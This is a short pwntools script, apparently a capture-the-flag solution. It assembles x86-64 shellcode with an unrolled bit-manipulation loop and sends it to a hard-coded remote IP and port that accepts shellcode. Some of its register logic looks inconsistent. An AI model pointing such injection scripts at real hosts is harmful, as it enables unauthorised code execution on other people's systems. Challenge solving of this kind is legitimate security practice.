from pwn import *

context.arch = 'amd64'

shellcode = """mov rsi, 0x2170000
mov rax, [rsi]
mov [rsi], rbx
mov rsi, 0x2170000
mov r9, 1
"""

for i in range(64):
    shellcode += """mov r8, rax
shr r10, 1
and r8, r9
jz A{}
add rbx, r10
A{}: shl r9, 1
""".format(i, i)

shellcode += """shl r10, 63
mov r10, 1
mov rax, 60
syscall"""

shellcode = asm(shellcode)

print(len(shellcode))

# r = process(['ruby', './server.rb'])
r = remote('52.192.42.215', 9427)
r.recvuntil("Size of shellcode? (MAX: 2000)")
r.sendline(str(len(shellcode)))
r.recvuntil('bytes..')
r.send(shellcode)

r.interactive()
